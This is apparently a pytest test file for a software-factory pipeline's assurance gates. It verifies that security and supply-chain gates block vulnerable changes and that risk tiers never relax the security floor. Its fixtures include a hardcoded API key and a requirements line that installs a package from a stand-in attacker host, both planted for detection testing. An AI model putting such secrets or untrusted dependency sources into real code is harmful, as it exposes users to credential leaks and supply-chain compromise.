"""Assurance gate wiring — the trust seam at the assurance boundary (T-M2-05).

Exercises ``foundry/graph/assurance_wiring.py`` end to end against the REAL
``TwoZoneGateRunner`` + REAL ``merge_gates``: materialize an integrated workdir
from seeded artifacts, run the Security / Audit / Supply-chain / E2E gates
through the runner, and assert

* **THE LOAD-BEARING TEST — a KNOWN-VULNERABLE change is CAUGHT:** a workdir
  carrying a hardcoded secret (the SecurityGate's grounded dev-secret rule) + a
  new dependency source (the Supply-chain gate's policy) yields ATTESTED FAILs →
  ``route_after_assurance`` does NOT advance (the vulnerable change is blocked);
* a clean change → every assurance gate attested PASS → advance;
* an UNSIGNED GateResult is dropped by ``merge_gates`` (never gates advancement);
* the tier scales DEPTH not INTEGRITY: a HIGH tier runs Supply-chain + E2E that a
  LOW tier omits, but Security + Audit (the floor) run at BOTH;
* an ERROR retries without latching; an integrated FAIL latches.
"""

from __future__ import annotations

import hashlib
from typing import Any

import pytest
from langchain_core.runnables import RunnableConfig

from foundry.agents import AgentRuntime
from foundry.agents._common import emit_artifact
from foundry.gates import DevGateWriteVerifier, TwoZoneGateRunner, ZoneBSigner
from foundry.graph.assurance_wiring import (
    ASSURANCE_BOUNDARY,
    DIFF_FILENAME,
    assurance_gate_set,
    materialize_assurance_workdir,
    route_after_assurance,
    run_assurance_gates,
)
from foundry.graph.gate_wiring import CRITERION_KIND, FEATURE_DIFF_KIND
from foundry.proxy import ModelProviderProxy
from foundry.proxy.test_doubles import MockTransport
from foundry.schemas.base import Artifact
from foundry.schemas.gates import GateResult, GateStatus, VerdictClass
from foundry.schemas.governance import RiskTier, TierDecision
from foundry.schemas.implementation import FeatureDiff
from foundry.schemas.product import AcceptanceCriterion
from foundry.state.factory_state import FactoryState
from foundry.state.global_records import GlobalRecords
from foundry.state.reducers import (
    merge_gates,
    reset_gate_write_verifier,
    set_gate_write_verifier,
)
from foundry.state.seq import Seq

KEY = b"zone-b-dev-key-0123456789abcdef"
KEY_ID = "zoneB-dev"
SCANNER_REV = "scanner-rev-1"
LINEAGE_REV = "lineage-rev-1"
RUN_ID = "run-1"

ASSURANCE = ASSURANCE_BOUNDARY


# ---- fixtures ---------------------------------------------------------------


@pytest.fixture
def records() -> GlobalRecords:
    return GlobalRecords()


@pytest.fixture
def runner(records: GlobalRecords) -> TwoZoneGateRunner:
    return TwoZoneGateRunner(ZoneBSigner(KEY, KEY_ID), records, SCANNER_REV, LINEAGE_REV)


@pytest.fixture
def verifier(records: GlobalRecords):
    v = DevGateWriteVerifier(KEY, KEY_ID, records)
    token = set_gate_write_verifier(v)
    try:
        yield v
    finally:
        reset_gate_write_verifier(token)


@pytest.fixture
def rt() -> AgentRuntime:
    # assurance_wiring never calls the proxy; rt is only used for rt.seq epochs.
    proxy = ModelProviderProxy(MockTransport(), signer=ZoneBSigner(KEY, KEY_ID))
    return AgentRuntime(proxy=proxy)


def _config(step: int = 1) -> RunnableConfig:
    return {"configurable": {"thread_id": RUN_ID}, "metadata": {"langgraph_step": step}}


def _seq(node: str, key: str, epoch: int = 1) -> Seq:
    return Seq(run_id=RUN_ID, emission_epoch=epoch, superstep_index=0, node_id=node, local=0)


def _tier(level: RiskTier) -> TierDecision:
    return TierDecision(
        tier=level,
        rationale=f"test {level}",
        run_against="design-ref",
        seq=_seq("triage", f"tier:{level}"),
    )


# ---- seeding artifacts + the in-memory resolvers ----------------------------


def _criterion(cid: str, *, security: bool = False) -> AcceptanceCriterion:
    return AcceptanceCriterion(
        id=cid,
        text=f"Given X When Y Then Z ({cid})",
        oracle_hint=f"test_{cid}",
        security_abuse=security,
        seq=_seq("product_manager", f"criterion:{cid}"),
    )


def _addition_diff(files: dict[str, str]) -> str:
    """A real unified-diff ADDITION blob — the body the adapters emit via put_blob."""
    parts: list[str] = []
    for path in sorted(files):
        body = files[path]
        lines = body.splitlines(keepends=True)
        parts.append(f"--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{len(lines)} @@\n")
        parts.extend(f"+{ln}" for ln in lines)
    return "".join(parts)


def _feature_diff(files: dict[str, str], *, task_id: str = "T1") -> tuple[FeatureDiff, str, bytes]:
    blob = _addition_diff(files).encode("utf-8")
    diff_uri = f"cas://sha256/{hashlib.sha256(blob).hexdigest()}"
    diff = FeatureDiff(
        diff_uri=diff_uri,
        task_id=task_id,
        branch=f"task/{task_id}",
        base_tree_sha="base-sha",
        seq=_seq("junior_engineer", f"diff:{task_id}"),
    )
    return diff, diff_uri, blob


def _seed(
    criteria: tuple[AcceptanceCriterion, ...],
    diffs: tuple[tuple[FeatureDiff, str, bytes], ...] = (),
) -> tuple[FactoryState, Any, Any]:
    """Seed state with criterion + feature_diff HANDLES, a typed resolver, a BlobResolver."""
    artifacts: list[Artifact] = []
    by_handle: dict[str, Any] = {}
    blobs: dict[str, bytes] = {}

    for c in criteria:
        handle = emit_artifact(c, CRITERION_KIND, "product_manager", c.seq)
        artifacts.append(handle)
        by_handle[handle.uri] = c

    for diff, diff_uri, blob in diffs:
        handle = Artifact(
            kind=FEATURE_DIFF_KIND,
            uri=f"cas://feature_diff/{diff.task_id}",
            produced_by="junior_engineer",
            task_id=diff.task_id,
            seq=diff.seq,
        )
        artifacts.append(handle)
        by_handle[handle.uri] = diff
        blobs[diff_uri] = blob

    def _resolve(handle: Artifact) -> Any:
        return by_handle[handle.uri]

    def _resolve_blob(uri: str) -> bytes:
        return blobs[uri]

    state: FactoryState = {"artifacts": artifacts}
    return state, _resolve, _resolve_blob


# Sources the assurance gates run over. The Audit gate needs a lockfile to
# rederive its inventory (else ERROR); a clean uv.lock with a permissive license
# keeps the floor green on a clean change.
_PASSING_TEST = "def test_ok():\n    assert 1 + 1 == 2\n"
_GOOD_MODULE = "VALUE = 42\n"
_CLEAN_LOCK = 'name = "pkg"\nlicense = "MIT"\n'

# A hardcoded secret the SecurityGate's dev secret-rule (hardcoded-password)
# detects — a KNOWN-VULNERABLE construct.
_VULN_MODULE = 'API_KEY = "supersecrethardcodedtoken123"\n'


def _clean_files() -> dict[str, str]:
    return {"app.py": _GOOD_MODULE, "test_app.py": _PASSING_TEST, "uv.lock": _CLEAN_LOCK}


# ---- THE LOAD-BEARING TEST: a known-vulnerable change is CAUGHT --------------


def test_known_vulnerable_change_is_caught(tmp_path, rt, runner, records, verifier):
    """A hardcoded secret -> SecurityGate attested FAIL -> route does NOT advance."""
    criteria = (_criterion("c1"), _criterion("c2", security=True))
    # The vulnerable change: a hardcoded secret in a source file.
    files = {"app.py": _VULN_MODULE, "test_app.py": _PASSING_TEST, "uv.lock": _CLEAN_LOCK}
    diff, uri, blob = _feature_diff(files)
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    out = run_assurance_gates(
        state,
        _config(),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "wd",
        tier=_tier(RiskTier.HIGH),
    )

    by_name = {g.name: g for g in out["gates"]}
    security = by_name["security"]
    # The Security gate caught the hardcoded secret — an ATTESTED FAIL.
    assert security.status is GateStatus.FAIL
    assert any("hardcoded-password" in f for f in security.findings)

    # It is runner-attested -> admitted by the REAL merge_gates (an agent could
    # not have forged it; only attested verdicts count, L5).
    folded = merge_gates(out["gates"], None)
    assert security in folded

    # The vulnerable change is BLOCKED: routing does NOT advance. (An integrated
    # FAIL latches stable-FAIL -> halt; either way it never advances.)
    decision = route_after_assurance(
        {**state, "gates": folded},
        _config(),
        records=records,
        tier=_tier(RiskTier.HIGH),
    )
    assert decision != "advance"
    assert decision == "halt"  # FAIL on an integrated digest latches -> terminal
    assert records.stable_fail_latched(security.run_against, "security")


def test_known_vulnerable_dependency_caught_by_supply_chain(
    tmp_path, rt, runner, records, verifier
):
    """A new dependency source in the diff -> Supply-chain attested FAIL -> blocked."""
    criteria = (_criterion("c1"), _criterion("c2", security=True))
    # A requirements edit pulling a package from an arbitrary VCS/URL source —
    # a supply-chain decision the gate polices off the integrated diff text.
    files = {
        "app.py": _GOOD_MODULE,
        "test_app.py": _PASSING_TEST,
        "uv.lock": _CLEAN_LOCK,
        "requirements.txt": "evil @ git+https://attacker.example/evil.git\n",
    }
    diff, uri, blob = _feature_diff(files)
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    out = run_assurance_gates(
        state,
        _config(),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "wd",
        tier=_tier(RiskTier.STANDARD),  # STANDARD adds Supply-chain
    )
    by_name = {g.name: g for g in out["gates"]}
    sc = by_name["supply_chain"]
    assert sc.status is GateStatus.FAIL
    assert any("new-dep-source" in f for f in sc.findings)

    folded = merge_gates(out["gates"], None)
    assert sc in folded  # attested -> admitted
    assert (
        route_after_assurance(
            {**state, "gates": folded},
            _config(),
            records=records,
            tier=_tier(RiskTier.STANDARD),
        )
        != "advance"
    )


# ---- a clean change -> all assurance gates attested PASS -> advance ----------


def test_clean_change_all_gates_pass_advance(tmp_path, rt, runner, records, verifier):
    criteria = (_criterion("c1"), _criterion("c2", security=True))
    diff, uri, blob = _feature_diff(_clean_files())
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    out = run_assurance_gates(
        state,
        _config(),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "wd",
        tier=_tier(RiskTier.HIGH),  # the full family runs
    )
    by_name = {g.name: g for g in out["gates"]}
    assert set(by_name) == {"security", "audit", "supply_chain", "e2e"}
    for name in ("security", "audit", "supply_chain", "e2e"):
        assert by_name[name].status is GateStatus.PASS, name

    folded = merge_gates(out["gates"], None)
    assert len(folded) == 4  # every attested verdict admitted
    assert (
        route_after_assurance(
            {**state, "gates": folded},
            _config(),
            records=records,
            tier=_tier(RiskTier.HIGH),
        )
        == "advance"
    )


# ---- an UNSIGNED GateResult is dropped by merge_gates (never gates advance) --


def test_unsigned_gateresult_dropped(verifier):
    """An agent-emitted (unsigned) security verdict can never gate advancement."""
    unsigned = GateResult(
        name="security",
        status=GateStatus.PASS,
        decision_deterministic=True,
        execution_deterministic=True,
        verdict_class=VerdictClass.EXECUTION_DETERMINISTIC,
        scanner_config_rev=SCANNER_REV,
        lineage_map_revision=LINEAGE_REV,
        results_digest="rd",
        run_against="a" * 64,
        seq=_seq("security_gate", "verdict:security"),
    )
    assert merge_gates([unsigned], None) == []


# ---- tier scales DEPTH, never INTEGRITY -------------------------------------


def test_tier_scales_depth_not_integrity_gate_set():
    """LOW = floor only; STANDARD adds supply_chain; HIGH adds e2e. Floor at ALL."""
    low = assurance_gate_set(_tier(RiskTier.LOW))
    standard = assurance_gate_set(_tier(RiskTier.STANDARD))
    high = assurance_gate_set(_tier(RiskTier.HIGH))
    none = assurance_gate_set(None)

    # The integrity FLOOR runs at EVERY tier (a LOW tier never skips it, gov §1e).
    for gs in (low, standard, high, none):
        assert "security" in gs and "audit" in gs

    # Depth is ADDED, never substituted for the floor.
    assert set(low) == {"security", "audit"}
    assert set(none) == {"security", "audit"}
    assert set(standard) == {"security", "audit", "supply_chain"}
    assert set(high) == {"security", "audit", "supply_chain", "e2e"}
    # Tiering NEVER relaxes integrity (the invariant the routing/admission rely on).
    assert _tier(RiskTier.LOW).relaxes_integrity() is False


def test_low_tier_runs_security_floor_high_adds_depth(tmp_path, rt, runner, records, verifier):
    """A LOW tier still runs the Security floor; a HIGH tier adds depth gates."""
    criteria = (_criterion("c1"), _criterion("c2", security=True))
    diff, uri, blob = _feature_diff(_clean_files())
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    low_out = run_assurance_gates(
        state,
        _config(),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "low",
        tier=_tier(RiskTier.LOW),
    )
    high_out = run_assurance_gates(
        state,
        _config(2),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "high",
        tier=_tier(RiskTier.HIGH),
    )
    low_names = {g.name for g in low_out["gates"]}
    high_names = {g.name for g in high_out["gates"]}

    # LOW omits the depth gates...
    assert low_names == {"security", "audit"}
    assert "supply_chain" not in low_names and "e2e" not in low_names
    # ...but the security FLOOR runs at BOTH tiers (integrity never relaxed).
    assert "security" in low_names and "security" in high_names
    # HIGH ADDS the depth on top of the same floor.
    assert high_names == {"security", "audit", "supply_chain", "e2e"}
    assert low_names < high_names


def test_low_tier_still_catches_vulnerability(tmp_path, rt, runner, records, verifier):
    """The security floor catches a hardcoded secret even at the LOW tier."""
    criteria = (_criterion("c1"),)
    files = {"app.py": _VULN_MODULE, "test_app.py": _PASSING_TEST, "uv.lock": _CLEAN_LOCK}
    diff, uri, blob = _feature_diff(files)
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    out = run_assurance_gates(
        state,
        _config(),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "wd",
        tier=_tier(RiskTier.LOW),  # the floor still runs fail-closed
    )
    security = {g.name: g for g in out["gates"]}["security"]
    assert security.status is GateStatus.FAIL  # LOW never skips the security floor
    folded = merge_gates(out["gates"], None)
    assert (
        route_after_assurance(
            {**state, "gates": folded}, _config(), records=records, tier=_tier(RiskTier.LOW)
        )
        != "advance"
    )


# ---- ERROR retries without latching; integrated FAIL latches ----------------


def test_audit_error_retries_without_latch(tmp_path, rt, runner, records, verifier):
    """No lockfile -> Audit inventory not rederivable -> signed ERROR -> fix, no latch."""
    criteria = (_criterion("c1"),)
    # No uv.lock / requirements -> Audit gate ERRORs (fail-closed, not a verdict).
    files = {"app.py": _GOOD_MODULE, "test_app.py": _PASSING_TEST}
    diff, uri, blob = _feature_diff(files)
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    out = run_assurance_gates(
        state,
        _config(),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "wd",
        tier=_tier(RiskTier.LOW),
    )
    audit = {g.name: g for g in out["gates"]}["audit"]
    assert audit.status is GateStatus.ERROR
    assert merge_gates(out["gates"], None)  # signed ERROR still admitted
    # ERROR never latches (infra, not a verdict, DS7).
    assert not records.stable_fail_latched(audit.run_against, "audit")

    folded = merge_gates(out["gates"], None)
    state_with = {**state, "gates": folded}
    # Within the convergence bound -> fix/retry, not halt.
    assert (
        route_after_assurance(
            state_with, _config(), records=records, tier=_tier(RiskTier.LOW), max_fix_attempts=3
        )
        == "fix"
    )
    # Once the bound is spent -> halt (escalate).
    assert (
        route_after_assurance(
            state_with,
            {"configurable": {"thread_id": RUN_ID, "fix_attempts": 3}, "metadata": {}},
            records=records,
            tier=_tier(RiskTier.LOW),
            max_fix_attempts=3,
        )
        == "halt"
    )


def test_integrated_fail_latches_and_does_not_autoclear(tmp_path, rt, runner, records, verifier):
    """A Security FAIL on the integrated digest latches; a later PASS never clears it."""
    criteria = (_criterion("c1"),)
    files = {"app.py": _VULN_MODULE, "test_app.py": _PASSING_TEST, "uv.lock": _CLEAN_LOCK}
    diff, uri, blob = _feature_diff(files)
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    out = run_assurance_gates(
        state,
        _config(),
        rt=rt,
        runner=runner,
        resolve=resolve,
        resolve_blob=resolve_blob,
        workdir=tmp_path / "wd",
        tier=_tier(RiskTier.LOW),
    )
    fail = {g.name: g for g in out["gates"]}["security"]
    assert fail.status is GateStatus.FAIL
    # run_against is an integrated tree_sha (hex digest) -> stable-FAIL latched.
    assert records.stable_fail_latched(fail.run_against, "security")

    folded = merge_gates(out["gates"], None)
    assert (
        route_after_assurance(
            {**state, "gates": folded}, _config(), records=records, tier=_tier(RiskTier.LOW)
        )
        == "halt"
    )
    # Even a hypothetical later PASS on the SAME digest still halts (latch terminal).
    good_pass = fail.model_copy(update={"status": GateStatus.PASS})
    assert (
        route_after_assurance(
            {**state, "gates": [good_pass]},
            _config(),
            records=records,
            tier=_tier(RiskTier.LOW),
        )
        == "halt"
    )


# ---- materialization writes the diff text the Supply-chain gate polices ------


def test_materialize_writes_changes_diff(tmp_path, verifier):
    criteria = (_criterion("c1"),)
    files = {"app.py": _GOOD_MODULE, "uv.lock": _CLEAN_LOCK}
    diff, uri, blob = _feature_diff(files)
    state, resolve, resolve_blob = _seed(criteria, ((diff, uri, blob),))

    run_against = materialize_assurance_workdir(
        state, tmp_path / "wd", resolve=resolve, resolve_blob=resolve_blob
    )
    # The integrated diff text is on disk where the Supply-chain gate reads it.
    diff_file = tmp_path / "wd" / DIFF_FILENAME
    assert diff_file.is_file()
    assert "+++ b/app.py" in diff_file.read_text(encoding="utf-8")
    # The augmented tree is hashed to an integrated digest (the verdict run_against).
    assert len(run_against) in (40, 64)
